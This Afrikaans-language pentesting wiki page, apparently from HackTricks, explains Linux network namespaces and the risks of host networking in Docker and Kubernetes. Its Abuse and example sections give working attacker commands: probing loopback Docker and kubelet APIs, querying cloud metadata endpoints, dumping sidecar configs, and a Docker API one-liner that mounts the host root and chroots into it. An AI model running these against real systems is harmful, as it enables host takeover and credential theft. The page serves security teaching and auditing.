# Netwerk-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-namespace isoleer netwerkverwante hulpbronne soos koppelvlakke, IP-adresse, roeteringstabelle, ARP/neighbor-toestand, firewall-reëls, sockets, die abstrakte socket-namespace van die UNIX-domain, en die inhoud van lêers soos `/proc/net`. Daarom kan 'n container iets hê wat soos sy eie `eth0`, sy eie plaaslike roetes en sy eie loopback-toestel lyk, sonder dat dit die host se werklike netwerkstack besit.

Wat sekuriteit betref, is dit belangrik omdat netwerk-isolasie oor veel meer as port binding gaan. 'n Private netwerk-namespace beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie namespace met die host gedeel word, kan die container skielik sigbaarheid kry van host-listeners, plaaslike host-dienste, abstrakte AF_UNIX-endpoints en netwerkbeheer-punte wat nooit bedoel was om aan die application blootgestel te word nie.

## Werking

'n Nuutgeskepte netwerk-namespace begin met 'n leë of byna leë netwerkomgewing totdat koppelvlakke daaraan gekoppel word. Container runtimes skep of koppel dan virtuele koppelvlakke, ken adresse toe en konfigureer roetes sodat die workload die verwagte konnektiwiteit het. In bridge-gebaseerde ontplooiings beteken dit gewoonlik dat die container 'n veth-gesteunde koppelvlak sien wat aan 'n host-bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod-networking.

Hierdie argitektuur verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide private netwerkstack te ontvang, sluit die workload by die host se werklike een aan.

## Lab

Jy kan 'n byna leë netwerk-namespace sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers met mekaar vergelyk:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die container met host-netwerk het nie meer sy eie geïsoleerde socket- en interface-aansig nie. Daardie verandering alleen is reeds beduidend voordat jy eers vra watter capabilities die proses het.

## Runtime Usage

Docker en Podman skep normaalweg ’n private network namespace vir elke container, tensy dit anders gekonfigureer is. Kubernetes gee gewoonlik aan elke Pod sy eie network namespace, wat deur die containers binne daardie Pod gedeel word, maar apart van die host is. Dit beteken dat `127.0.0.1` gewoonlik Pod-lokaal eerder as container-lokaal is: ’n listener wat slegs aan localhost gebind is in een container, is tipies vanaf sy sidecars en siblings bereikbaar. Incus/LXC-stelsels verskaf ook uitgebreide network-namespace-gebaseerde isolasie, dikwels met ’n groter verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat private networking die verstek-isolasiegrens is, terwyl host networking ’n uitdruklike opt-out van daardie grens is.

## Misconfigurations

Die belangrikste misconfiguration is bloot om die host se network namespace te deel. Dit word soms vir performance, low-level monitoring of convenience gedoen, maar dit verwyder een van die duidelikste grense wat vir containers beskikbaar is. Host-lokale listeners word op ’n meer direkte manier bereikbaar, localhost-only-dienste kan toeganklik word, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die operasies wat hulle moontlik maak, nou op die host se eie network environment toegepas word.

Nog ’n probleem is om network-related capabilities te ruim toe te ken, selfs wanneer die network namespace private is. ’n Private namespace help wel, maar dit maak raw sockets of gevorderde network control nie onskadelik nie.

In Kubernetes verander `hostNetwork: true` ook hoeveel vertroue jy in Pod-level network segmentation kan plaas. Kubernetes dokumenteer dat baie network plugins nie verkeer vanaf `hostNetwork` Pods behoorlik vir `podSelector` / `namespaceSelector`-matching kan onderskei nie en dit daarom as gewone node-verkeer behandel. Vanuit ’n aanvaller se oogpunt beteken dit dat ’n gekompromitteerde `hostNetwork` workload dikwels as ’n node-level network foothold behandel moet word, eerder as ’n normale Pod wat steeds deur dieselfde policy-aannames as overlay-network workloads beperk word.

## Abuse

In swak geïsoleerde opstellings kan aanvallers host-listening-dienste inspekteer, management endpoints bereik wat slegs aan loopback gebind is, verkeer sniff of daarmee inmeng, afhangend van die presiese capabilities en environment, of routing- en firewall-state herkonfigureer indien `CAP_NET_ADMIN` teenwoordig is. In ’n cluster kan dit ook laterale beweging en control-plane reconnaissance vergemaklik.

As jy host networking vermoed, begin deur te bevestig dat die sigbare interfaces en listeners aan die host behoort eerder as aan ’n geïsoleerde container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste wat slegs op loopback beskikbaar is, is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakte UNIX sockets is nog ’n teiken wat maklik misgekyk word omdat hulle tot die netwerknaamruimte beperk is, al lyk hulle nie soos TCP/UDP-listeners nie en bestaan hulle dalk nie as lêerstelselpaaie onder `/run` nie. ’n Houer met die host se netwerk kan gevolglik toegang verkry tot beheerkanale wat slegs op die host beskikbaar is en wat nooit in die houer gemount is nie:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
'n Historiese voorbeeld was die `containerd-shim`-blootstellingsfout met abstracte sockets, maar die breër les is belangriker as die spesifieke CVE: sodra 'n workload by die host se network namespace aansluit, word abstracte AF_UNIX-dienste ook deel van die attack surface. As daardie sockets runtime-verwant of administratief lyk, skakel oor na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

As network capabilities teenwoordig is, toets of die workload die sigbare stack kan inspekteer of wysig:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Op moderne kernels kan host networking plus `CAP_NET_ADMIN` ook die packet path buite eenvoudige veranderinge aan `iptables` / `nftables` blootstel. `tc` qdiscs en filters is ook namespace-scoped, dus pas hulle in ’n gedeelde host network namespace toe op die host interfaces wat die container kan sien. Indien `CAP_BPF` ook teenwoordig is, word network-related eBPF programs soos TC- en XDP-loaders ook relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dit is belangrik omdat ’n attacker moontlik verkeer op die host-interface-vlak kan mirror, redirect, shape of drop, en nie net firewall-reëls kan herskryf nie. In ’n private network namespace word hierdie aksies tot die container se aansig beperk; in ’n gedeelde host namespace raak dit die host.

In cluster- of cloud-omgewings regverdig host networking ook vinnige plaaslike recon van metadata en control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes, onthou dat die kompromittering van **enige** container in ’n multi-container Pod ook toegang gee tot localhost-luisteraars wat deur sibling-containers en sidecars oopgemaak is, omdat die hele Pod een netwerknaamruimte deel. Dit word veral relevant met service-mesh-, observability- en helper-containers waarvan die admin- of debug-koppelvlakke doelbewus Pod-intern eerder as klusterwyd is:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Behandel "bound to localhost" as **Pod-private**, nie **container-private** nie. Nadat een container in die Pod gekompromitteer is, is daardie aanname nie meer geldig nie.

### Volledige voorbeeld: Host Networking + Local Runtime / Kubelet Access

Host networking verskaf nie outomaties host root nie, maar dit stel dikwels services bloot wat doelbewus slegs vanaf die node self bereikbaar is. Indien een van daardie services swak beskerm word, word host networking ’n direkte privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte host-kompromittering indien ’n plaaslike runtime API sonder behoorlike beskerming blootgestel is
- cluster-verkenning of laterale beweging indien kubelet of plaaslike agente bereikbaar is
- verkeersmanipulasie of denial of service wanneer dit met `CAP_NET_ADMIN` gekombineer word

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die proses ’n private network stack het, watter roetes en listeners sigbaar is, en of die network-aansig reeds soos dié van die host lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Wat hier interessant is:

- As `/proc/self/ns/net` en `/proc/1/ns/net` reeds soos die host lyk, gebruik die container moontlik die host se network namespace of ’n ander nie-private namespace.
- `lsns -t net` en `ip netns identify` is nuttig wanneer die shell reeds binne ’n named of persistent namespace is en jy dit met `/run/netns`-objects vanaf die host-kant wil korreleer.
- `ss -lntup` is besonder waardevol omdat dit loopback-only listeners en plaaslike management endpoints openbaar. `ss -xap` en `/proc/net/unix` voeg die abstract-socket-aansig by wat gewone filesystem-socket-soektogte mis.
- Routes, interface names, firewall context, `tc`-state en eBPF attachments word baie belangriker as `CAP_NET_ADMIN`, `CAP_NET_RAW` of `CAP_BPF` teenwoordig is.
- In Kubernetes kan mislukte service-name resolution vanaf ’n `hostNetwork` Pod eenvoudig beteken dat die Pod nie `dnsPolicy: ClusterFirstWithHostNet` gebruik nie, en nie dat die service afwesig is nie.
- In multi-container Pods behoort localhost-listeners aan die hele Pod se network namespace. Kontroleer dus sidecars en sibling containers voordat jy aanvaar dat ’n loopback-only port ontoeganklik is vanaf die compromised container.

Wanneer jy ’n container hersien, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk network capabilities het ’n heel ander security posture as bridge networking plus ’n beperkte default capability set.

## Verwysings

- [Kubernetes NetworkPolicy en `hostNetwork`-voorbehoude](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` en abstract UNIX-socket-isolasie](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets blootgestel aan host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [eBPF-token- en capability-vereistes vir network-related eBPF-programme](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
